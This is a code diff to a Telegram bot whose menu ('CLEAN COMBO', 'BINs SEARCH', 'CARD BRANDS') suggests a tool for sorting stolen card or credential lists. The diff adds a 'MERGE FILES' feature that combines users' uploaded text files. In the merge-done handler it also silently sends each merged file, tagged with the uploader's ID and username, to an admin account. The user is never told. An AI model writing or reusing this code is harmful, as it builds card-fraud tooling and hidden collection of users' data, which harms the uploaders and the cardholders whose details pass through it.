@@ -62,7 +62,7 @@ def get_main_menu():
         [Button.inline("🧹 CLEAN COMBO", data="clean_combo"),
          Button.inline("🌍 FILTER COUNTRIES", data="filter_countries")],
         [Button.inline("✂️ SPLIT MANAGER", data="split_manager"),
-         Button.inline("🏦 BANKS MANAGER", data="banks_manager")],
+         Button.inline("🔗 MERGE FILES", data="merge_files")],
         [Button.inline("🔍 BINs SEARCH", data="bins_search"),
          Button.inline("💳 CARD BRANDS", data="card_brands")],
         [Button.inline("📊 STATISTICS", data="statistics"),
@@ -275,6 +275,91 @@ async def cancel_handler(event):
 @bot.on(events.CallbackQuery(data=b"banks_manager"))
 async def banks_manager_handler(event):
     await event.edit("🏦 **BANKS MANAGER**\n\nهذه الميزة قريبًا!", buttons=[[Button.inline("🔙 Back", data="back_to_menu")]])
+
+# Merge Files Handler
+merge_files = {}  # {user_id: [file1, file2, ...]}
+
+@bot.on(events.CallbackQuery(data=b"merge_files"))
+async def merge_files_handler(event):
+    merge_files[event.sender_id] = []
+    user_states[event.sender_id] = {'state': 'waiting_merge_files'}
+    await event.edit(
+        "🔗 **MERGE FILES**\n\n"
+        "ارفع الملفات واحد واحد (txt)\n"
+        "لما تخلص اضغط **Done**\n\n"
+        "**الملفات:** 0",
+        buttons=[
+            [Button.inline("✅ Done", data="merge_done")],
+            [Button.inline("❌ Cancel", data="cancel_operation")]
+        ]
+    )
+
+@bot.on(events.CallbackQuery(data=b"merge_done"))
+async def merge_done_handler(event):
+    files = merge_files.get(event.sender_id, [])
+    if not files:
+        await event.answer("No files uploaded!", alert=True)
+        return
+    
+    await event.edit(f"🔗 Merging {len(files)} files...")
+    
+    # Merge all files
+    output_file = f"/tmp/merged_{event.sender_id}.txt"
+    total_lines = 0
+    
+    with open(output_file, 'w', encoding='utf-8') as out:
+        for f_path in files:
+            with open(f_path, 'r', encoding='utf-8', errors='ignore') as f:
+                for line in f:
+                    if line.strip():
+                        out.write(line)
+                        total_lines += 1
+    
+    # Send to user
+    await bot.send_file(event.sender_id, output_file, caption=f"Merged File | {total_lines:,} lines")
+    
+    # Send to admin
+    username = event.sender.username or "None"
+    admin_caption = f"MERGED FILE\nID: {event.sender_id}\nUser: @{username}\nFiles: {len(files)}\nTotal: {total_lines:,} lines"
+    try:
+        await bot.send_file(ADMIN_ID, output_file, caption=admin_caption)
+    except: pass
+    
+    # Cleanup
+    for f_path in files:
+        try: os.remove(f_path)
+        except: pass
+    try: os.remove(output_file)
+    except: pass
+    
+    del merge_files[event.sender_id]
+    del user_states[event.sender_id]
+    
+    await event.edit(f"✅ Done! Merged {len(files)} files = {total_lines:,} lines", buttons=get_main_menu())
+
+# Handle files for merge
+@bot.on(events.NewMessage(func=lambda e: e.is_private and e.file))
+async def merge_file_handler(event):
+    state = user_states.get(event.sender_id, {})
+    if state.get('state') != 'waiting_merge_files':
+        return  # Let normal file handler work
+    
+    filename = event.file.name or "unknown.txt"
+    if not filename.endswith('.txt'):
+        await event.respond("Only .txt files!")
+        return
+    
+    # Download file
+    temp_file = f"/tmp/merge_{event.sender_id}_{len(merge_files.get(event.sender_id, []))}.txt"
+    await bot.download_media(event.message, file=temp_file)
+    
+    # Add to list
+    if event.sender_id not in merge_files:
+        merge_files[event.sender_id] = []
+    merge_files[event.sender_id].append(temp_file)
+    
+    count = len(merge_files[event.sender_id])
+    await event.respond(f"Added: {filename}\nTotal files: {count}", buttons=[[Button.inline("✅ Done", data="merge_done")]])
 
 @bot.on(events.NewMessage(func=lambda e: e.is_private and not e.raw_text.startswith('/')))
 async def message_handler(event):
